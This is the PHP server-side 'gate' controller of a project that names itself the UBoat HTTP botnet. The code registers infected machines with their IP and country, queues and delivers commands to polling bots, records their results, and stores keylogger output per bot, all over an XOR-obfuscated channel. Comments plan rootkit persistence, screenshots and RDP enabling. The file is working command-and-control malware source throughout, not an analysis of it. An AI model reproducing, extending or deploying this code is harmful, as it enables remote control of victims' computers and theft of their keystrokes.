<?php

/**
 * This file is part of UBoat - HTTP Botnet Project
 */

// todo: clean this
//rootkit (prevent uninstalling and persist)
//screenshot
//enable RDP
class gate extends Controller
{
    public function index()
    {
        goat::$app->cleanPage();

        if (empty($_POST) || ! isset($_POST['x']) && empty($_POST['x']) || ! isset(getallheaders()['X-Token']) && empty(getallheaders()['X-Token'])) {
            //here if the request isnt post it returns your ip
            $ip = null;
            if (! empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
            $view = $this->loadView('gate');

            return $view->render(['data' => $ip]);
        }

        //load the helper
        $pdo = new \PDO('mysql:host='.goat::$app->config['db']['host'].';dbname='.goat::$app->config['db']['dbname'], goat::$app->config['db']['username'], goat::$app->config['db']['password']);
        $geo_helper = $this->loadHelper('geoip_helper');
        $heart = $this->loadHelper('heartbeat');
        $encrypted = $_POST['x'];
        $key = getallheaders()['X-Token'];
        $decrypted = $this->BoatDecryptionRoutine($encrypted, $key);

        $commandData = null;
        $commandType = null;

        $commandId = $this->ParseCommand($decrypted, $commandData, $commandType);

        $output = $this->CreateCommand(-1, -1, 'This will terminate the app.');

        switch ($commandType) {
            case 0:
                //its a join
                //handle the db incertion
                $ip = null;
                if (! empty($_SERVER['HTTP_CLIENT_IP'])) {
                    $ip = $_SERVER['HTTP_CLIENT_IP'];
                } elseif (! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                } else {
                    $ip = $_SERVER['REMOTE_ADDR'];
                }
                $_dbcommand = $commandData;
                $_dbcommand .= '@'.$ip;

                $ip = $geo_helper->GetCountryFromAddress($ip);
                $_dbcommand .= '@'.$ip['country_name'].'@'.$ip['country_code'];
                $botId = $heart->beat($heart->splitToArray($_dbcommand));

                $output = $this->CreateCommand(-1, 0, $botId);

                break;

            case 1:
                //its the client requesting for commands to process(the POLL)

                //query database. get all running commands that the client hasn't done yet
                //lets simulate the response
                date_default_timezone_set('America/New_York');
                $p = [];
                $p[':botid'] = getallheaders()['X-Id']; //nothing else should be passed
                $p[':ls'] = date('Y-m-d H:i:s');
                //update last seen
                $statement = $pdo->prepare('UPDATE `bots` SET `lastseen` = :ls WHERE `id` = :botid');
                $statement->execute($p);

                $p = [];
                $p[':botid'] = getallheaders()['X-Id']; //nothing else should be passed

                $statement = $pdo->prepare('SELECT c.* FROM commands c INNER JOIN botcommands bc ON c.id = bc.commandId WHERE bc.botId = :botid AND bc.result IS NULL');
                $statement->execute($p);
                $result = $statement->fetchAll(PDO::FETCH_ASSOC);
                $statement->closeCursor();

                $commands = [];
                foreach ($result as $command) {
                    array_push($commands, $this->CreateCommand($command['id'], $command['commandtype'], $command['commandString']));
                }
                $statement->closeCursor();
                $finalCommandData = implode("\n", $commands);
                $output = $this->CreateCommand(-1, 1, $finalCommandData);
                break;

            default:

                switch ($commandType) {
                    case -1:
                        break;
                    case 0:
                        break;
                    case 1:
                        break;
                    default:
                        if (-1 == $commandId && 6 == $commandType) {
                            //write $commandData to the end of the file, name it
                            //keylog_result_botid
                            $id = getallheaders()['X-Id'];
                            $fileName = 'keylog_result_'.$id; //. ".txt";

                            file_put_contents(APP_DIR."logs\\$fileName", $heart->log_aes('encrypt', $commandData), FILE_APPEND);
                            break;
                        }
                        $res = [];
                        $res[':botId'] = getallheaders()['X-Id'];
                        $res[':commandId'] = $commandId;
                        $res[':result'] = $commandData;

                        $statement = $pdo->prepare('UPDATE botcommands SET result = :result WHERE botId = :botId AND commandId = :commandId');
                        $statement->execute($res);

                        break;
                }

                break;
        }

        $newKey = openssl_random_pseudo_bytes(32);
        $encodedNewKey = null;

        $encryptedResponse = $this->BoatEncryptionRoutine($output, $newKey, $encodedNewKey);
        header('X-Token: '.$encodedNewKey);

        $pdo = null;
        $view = $this->loadView('gate');

        return $view->render(['data' => $encryptedResponse]);

        //die($encryptedResponse);
    }

    private function CreateCommand($commandId, $commandType, $data)
    {
        return $commandId.'|'.$commandType.'|'.strtoupper(((0 != strlen($data)) ? '%' : '').implode('%', str_split(bin2hex($data), 2)));
    }

    private function ParseCommand($rawData, &$data, &$commandType)
    {
        $splitInfo = explode('|', $rawData);
        $data = urldecode($splitInfo[2]);
        $commandType = (int) $splitInfo[1];

        return (int) $splitInfo[0];
    }

    private function XORInputKey($input, $key, $inputLength, $keyLength)
    {
        $output = [];
        for ($i = 0; $i < $inputLength; ++$i) {
            $output[] = $input[$i] ^ $key[$i % $keyLength];
        }

        return $output;
    }

    //we'll use this xor shit kk

    private function BoatDecryptionRoutine($input, $key)
    {
        $output = str_split(urldecode($input));
        $key = str_split(urldecode($key));
        $output = $this->XORInputKey($output, $key, count($output), count($key));

        return implode($output);
    }

    private function BoatEncryptionRoutine($input, $key, &$encodedKey)
    {
        if (! is_array($input)) {
            $input = str_split($input);
        }
        if (! is_array($key)) {
            $key = str_split($key);
        }
        $output = $this->XORInputKey($input, $key, count($input), count($key));
        $output = implode($output);
        $key = implode($key);

        $output = strtoupper('%'.implode('%', str_split(bin2hex($output), 2)));
        $encodedKey = strtoupper('%'.implode('%', str_split(bin2hex($key), 2)));

        return $output;
    }
}
